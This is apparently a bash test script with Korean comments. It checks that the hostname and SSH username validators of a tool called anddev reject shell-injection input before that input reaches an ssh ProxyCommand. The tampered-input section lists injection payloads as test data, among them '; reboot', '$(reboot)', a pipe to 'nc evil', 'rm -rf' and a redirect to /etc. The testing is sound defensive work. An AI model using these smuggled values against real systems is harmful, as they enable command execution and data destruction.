#!/usr/bin/env bash
# =============================================================================
# anddev connect 입력 검증 계약 테스트 — 경계값 4종 (정상/매핑/None/변조)
#
#   대상: anddev.sh 의 valid_hostname / valid_ssh_user.
#   왜:   connect 의 host 는 ssh ProxyCommand 문자열에 박혀 '/bin/sh -c' 로 실행된다.
#         검증을 통과한 값만 들어가야 쉘 명령 주입(예: 'h; reboot')을 막을 수 있다.
#         이 검증기가 신뢰 경계 — 메타문자/공백/빈값을 정확히 걸러야 한다.
#
#   실행:  bash tests/connect_test.sh      (종료코드 0 = 전체 통과)
# =============================================================================
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "$HERE/.." && pwd)"

# 소싱 — 가드 덕분에 main 은 안 돌고 함수만 로드된다.
# shellcheck disable=SC1090
source "$ROOT/anddev.sh"
set +e   # anddev.sh 의 'set -euo pipefail' 가 하네스에 번지지 않게 -e 해제

PASS=0; FAIL=0
# ok <fn> <설명> <입력>      → 유효(rc 0)여야 통과
ok()  { local fn="$1" desc="$2" in="$3"; "$fn" "$in"; if [ $? -eq 0 ]; then PASS=$((PASS+1)); printf '  ✓ %s\n' "$desc"; else FAIL=$((FAIL+1)); printf '  ✗ %s  (거부됨, 입력=<%s>)\n' "$desc" "$in"; fi; }
# no <fn> <설명> <입력>      → 무효(rc≠0)여야 통과
no()  { local fn="$1" desc="$2" in="$3"; "$fn" "$in"; if [ $? -ne 0 ]; then PASS=$((PASS+1)); printf '  ✓ %s\n' "$desc"; else FAIL=$((FAIL+1)); printf '  ✗ %s  (허용됨!, 입력=<%s>)\n' "$desc" "$in"; fi; }

echo "== 1) 정상 (normal) — 올바른 호스트/계정은 통과 =="
ok valid_hostname "trycloudflare quick tunnel 호스트" "abcd-efgh.trycloudflare.com"
ok valid_hostname "숫자 포함 라벨"                    "x1-y2.trycloudflare.com"
ok valid_ssh_user "기본 계정 dev"                     "dev"
ok valid_ssh_user "밑줄/하이픈 계정"                  "my_user-01"

echo "== 2) 매핑 (mapping) — 탈출구(Named Tunnel 커스텀 도메인)도 허용 =="
ok valid_hostname "커스텀 도메인(Named Tunnel)"       "dev.example.com"
ok valid_hostname "다중 라벨 도메인"                  "a.b.c.example.co.kr"

echo "== 3) None (빈값/누락) — 빈 입력은 거부 =="
no valid_hostname "빈 호스트"                          ""
no valid_ssh_user "빈 사용자"                          ""

echo "== 4) 변조 (tampered) — 쉘 메타문자/공백/개행 주입은 거부 =="
no valid_hostname "세미콜론 명령 주입"                "x.trycloudflare.com; reboot"
no valid_hostname "명령치환 \$()"                     "\$(reboot)"
no valid_hostname "백틱 치환"                          "x.trycloudflare.com\`id\`"
no valid_hostname "파이프"                            "x.trycloudflare.com|nc evil 1"
no valid_hostname "앰퍼샌드 백그라운드"               "x.trycloudflare.com&touch /tmp/x"
no valid_hostname "공백 포함"                         "x.trycloudflare.com rm -rf"
no valid_hostname "개행 주입"                         "x.trycloudflare.com
reboot"
no valid_hostname "따옴표"                            "x\".trycloudflare.com"
no valid_hostname "리다이렉트"                        "x.trycloudflare.com>/etc/x"
no valid_ssh_user "계정 세미콜론 주입"               "root;evil"
no valid_ssh_user "계정 공백"                         "a b"
no valid_ssh_user "계정 명령치환"                     "\$(id)"

echo
echo "------------------------------------------------------------"
printf '결과:  %d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ] || { echo "✗ 실패한 테스트가 있습니다."; exit 1; }
echo "✓ 전체 통과"
